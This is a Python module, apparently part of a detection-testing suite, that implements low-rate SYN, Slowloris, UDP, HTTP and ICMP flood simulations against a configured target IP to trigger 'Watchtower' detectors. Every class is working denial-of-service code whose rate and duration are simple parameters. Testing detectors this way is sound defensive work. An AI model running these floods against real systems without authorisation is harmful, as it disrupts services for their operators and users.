"""
Denial-of-Service pattern simulation modules.

Tests against Watchtower detectors:
- watchtower.recon (syn_flood)
- watchtower.stateful.host (recon.syn_flood)

NOTE: All DoS simulations use LOW rates to avoid causing real disruption.
The rates are intentionally below destructive thresholds but high enough
to potentially trigger detection heuristics.
"""

import os
import random
import socket
import struct
import time
from typing import Optional

from traffic_testing.attacks.base import BaseAttack
from traffic_testing.config import TARGET_IP, SYN_FLOOD_RATE, SYN_FLOOD_DURATION


class SYNFloodLowRate(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, rate: int = SYN_FLOOD_RATE,
                 duration: int = SYN_FLOOD_DURATION):
        super().__init__("syn_flood_low_rate", "dos", target_ip)
        self.rate = rate
        self.duration = duration

    def execute(self) -> None:
        try:
            from scapy.all import IP, TCP, send, conf
            conf.verb = 0
            start = time.time()
            sent = 0
            while time.time() - start < self.duration and not self._stop_event.is_set():
                pkt = IP(dst=self.target_ip) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=random.randint(80, 443),
                    flags="S",
                    seq=random.randint(0, 2**32),
                )
                send(pkt, verbose=0)
                sent += 1
                if sent % 50 == 0:
                    self.log_packet({
                        "protocol": "TCP",
                        "dst_ip": self.target_ip,
                        "flags": "SYN",
                        "total_sent": sent,
                        "rate": self.rate,
                        "test_for": "recon.syn_flood",
                    })
                time.sleep(1.0 / self.rate)
            self.result.metadata["total_syns"] = sent
        except ImportError:
            start = time.time()
            sent = 0
            while time.time() - start < self.duration and not self._stop_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    s.connect_ex((self.target_ip, random.randint(80, 443)))
                    sent += 1
                    s.close()
                except Exception:
                    pass
                if sent % 50 == 0:
                    self.log_packet({
                        "protocol": "TCP",
                        "dst_ip": self.target_ip,
                        "flags": "SYN",
                        "total_sent": sent,
                        "method": "socket_fallback",
                    })
                time.sleep(1.0 / self.rate)
            self.result.metadata["total_syns"] = sent


class SlowlorisPattern(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, port: int = 80,
                 connections: int = 20, duration: int = 60):
        super().__init__("slowloris", "dos", target_ip)
        self.port = port
        self.connections = connections
        self.duration = duration
        self._sockets: list = []

    def execute(self) -> None:
        for i in range(self.connections):
            if self._stop_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((self.target_ip, self.port))
                s.send(f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode())
                self._sockets.append(s)
                self.log_packet({
                    "protocol": "HTTP",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "connection": i + 1,
                    "type": "slowloris_initial",
                })
            except Exception:
                pass
        start = time.time()
        while time.time() - start < self.duration and not self._stop_event.is_set():
            for s in self._sockets[:]:
                try:
                    s.send(f"X-Padding: {random.randint(1000, 9999)}\r\n".encode())
                except Exception:
                    self._sockets.remove(s)
            self.log_packet({
                "protocol": "HTTP",
                "dst_ip": self.target_ip,
                "dst_port": self.port,
                "active_connections": len(self._sockets),
                "type": "slowloris_keepalive",
                "test_for": "dos.slowloris",
            })
            time.sleep(10)

    def teardown(self) -> None:
        for s in self._sockets:
            try:
                s.close()
            except Exception:
                pass
        self._sockets.clear()


class UDPFloodLowRate(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, rate: int = 30, duration: int = 30):
        super().__init__("udp_flood_low_rate", "dos", target_ip)
        self.rate = rate
        self.duration = duration

    def execute(self) -> None:
        start = time.time()
        sent = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() - start < self.duration and not self._stop_event.is_set():
            payload = os.urandom(random.randint(64, 512))
            port = random.choice([53, 123, 161, 500, 1900, 5353])
            try:
                sock.sendto(payload, (self.target_ip, port))
                sent += 1
            except Exception:
                pass
            if sent % 30 == 0:
                self.log_packet({
                    "protocol": "UDP",
                    "dst_ip": self.target_ip,
                    "dst_port": port,
                    "payload_size": len(payload),
                    "total_sent": sent,
                    "test_for": "dos.udp_flood",
                })
            time.sleep(1.0 / self.rate)
        sock.close()
        self.result.metadata["total_packets"] = sent


class HTTPFloodLowRate(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, port: int = 80,
                 rate: int = 20, duration: int = 30):
        super().__init__("http_flood_low_rate", "dos", target_ip)
        self.port = port
        self.rate = rate
        self.duration = duration

    def execute(self) -> None:
        start = time.time()
        sent = 0
        paths = ["/", "/index.html", "/api/data", "/login", "/static/app.js",
                 "/images/logo.png", "/api/users", "/health", "/metrics"]
        while time.time() - start < self.duration and not self._stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                s.connect((self.target_ip, self.port))
                path = random.choice(paths)
                http_request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: close\r\n\r\n"
                )
                s.send(http_request.encode())
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                s.close()
                sent += 1
            except Exception:
                pass
            if sent % 20 == 0:
                self.log_packet({
                    "protocol": "HTTP",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "method": "GET",
                    "total_requests": sent,
                    "rate": self.rate,
                    "test_for": "dos.http_flood",
                })
            time.sleep(1.0 / self.rate)
        self.result.metadata["total_requests"] = sent


class ICMPFloodLowRate(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, rate: int = 20, duration: int = 30):
        super().__init__("icmp_flood_low_rate", "dos", target_ip)
        self.rate = rate
        self.duration = duration

    def execute(self) -> None:
        try:
            from scapy.all import IP, ICMP, send, conf
            conf.verb = 0
            start = time.time()
            sent = 0
            while time.time() - start < self.duration and not self._stop_event.is_set():
                pkt = IP(dst=self.target_ip) / ICMP(type=8) / os.urandom(random.randint(64, 1024))
                send(pkt, verbose=0)
                sent += 1
                time.sleep(1.0 / self.rate)
            self.result.metadata["total_packets"] = sent
        except ImportError:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            start = time.time()
            sent = 0
            while time.time() - start < self.duration and not self._stop_event.is_set():
                try:
                    icmp_header = struct.pack(">BBHHH", 8, 0, 0,
                                              random.randint(1, 65535), sent)
                    payload = os.urandom(64)
                    sock.sendto(icmp_header + payload, (self.target_ip, 0))
                    sent += 1
                except Exception:
                    pass
                time.sleep(1.0 / self.rate)
            sock.close()
            self.result.metadata["total_packets"] = sent
